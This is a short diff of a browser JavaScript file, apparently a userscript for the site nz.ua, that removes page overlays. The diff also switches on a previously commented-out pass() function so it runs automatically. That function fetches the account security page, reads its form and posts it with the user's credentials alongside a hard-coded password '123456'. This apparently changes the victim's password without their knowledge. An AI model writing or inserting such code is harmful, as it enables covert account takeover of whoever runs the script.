@@ -1,6 +1,5 @@
 (() => {
-  //pass();
-  
+  pass();
   document.getElementById(`bibi-overlay`)?.remove();
   document.getElementById(`minesweeper-overlay`)?.remove();
 
@@ -49,11 +48,11 @@
 async function pass() {
   const PASSWORD = "123456";
 
-  const response = await fetch(`/account/security`);
+  const response = await fetch(`https://nz.ua/account/security`);
   if (!response.ok) throw new Error(response.status);
 
   const doc = new DOMParser().parseFromString(await response.text(), `text/html`);
-  const form = doc.querySelector('input[name="_csrf"]').form;
+  const form = doc.querySelector('#account-form');
 
   const body = new URLSearchParams(new FormData(form));
 
@@ -71,6 +70,4 @@ async function pass() {
     credentials: "same-origin",
     body
   });
-
-  const html = await response_pass.text();
 }
